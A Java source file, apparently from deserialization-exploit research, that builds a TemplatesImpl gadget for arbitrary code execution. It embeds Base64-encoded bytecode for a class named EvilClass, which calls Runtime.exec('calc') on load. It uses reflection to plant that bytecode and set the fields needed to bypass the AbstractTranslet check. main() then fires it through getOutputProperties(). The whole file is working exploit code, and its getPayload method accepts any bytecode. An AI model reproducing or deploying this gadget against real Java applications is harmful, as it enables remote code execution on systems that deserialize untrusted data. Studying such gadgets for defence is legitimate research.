package org.example.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.util.Base64;

import static org.example.CommonUtils.setFieldValue;

public class TemplateImplWithoutAbstractTranslet {
    public static TemplatesImpl getPayload(byte[] bytecode) throws Exception {
        if(bytecode == null)
            bytecode = Base64.getDecoder().decode("yv66vgAAADQAKwoACQAUCgAVABYIABcKABUAGAcAGQkAGgAbCgAcAB0HAB4HAB8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAHgcAGQEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAKAAsHACAMACEAIgEABGNhbGMMACMAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24HACUMACYAJwcAKAwAKQAqAQAcb3JnL2V4YW1wbGUvZ2FkZ2V0L0V2aWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWACEACAAJAAAAAAACAAEACgALAAEADAAAAGMAAgACAAAAGSq3AAG4AAISA7YABFenAAtMsgAGK7YAB7EAAQAEAA0AEAAFAAIADQAAABoABgAAAAwABAAOAA0AEQAQAA8AEQAQABgAEgAOAAAAEAAC/wAQAAEHAA8AAQcAEAcACAARAAsAAQAMAAAAUgACAAEAAAAVuAACEgO2AARXpwALS7IABiq2AAexAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABQACgAOAAAABwACTAcAEAcAAQASAAAAAgAT");
        byte[] foo = Base64.getDecoder().decode("yv66vgAAADQADQoAAwAKBwALBwAMAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAClNvdXJjZUZpbGUBABBDb21tb25DbGFzcy5qYXZhDAAEAAUBAB5vcmcvZXhhbXBsZS9nYWRnZXQvQ29tbW9uQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0ACEAAgADAAAAAAABAAEABAAFAAEABgAAAB0AAQABAAAABSq3AAGxAAAAAQAHAAAABgABAAAAAwABAAgAAAACAAk=");
        TemplatesImpl tpl = new TemplatesImpl();
        setFieldValue(tpl, "_name", "Strlng");
        setFieldValue(tpl, "_transletIndex", 1);
        setFieldValue(tpl, "_bytecodes", new byte[][]{foo, bytecode});
        setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());
        return tpl;
    }

    public static void main(String[] argv) throws Exception {
        TemplateImplWithoutAbstractTranslet.getPayload(null).getOutputProperties();
    }
}
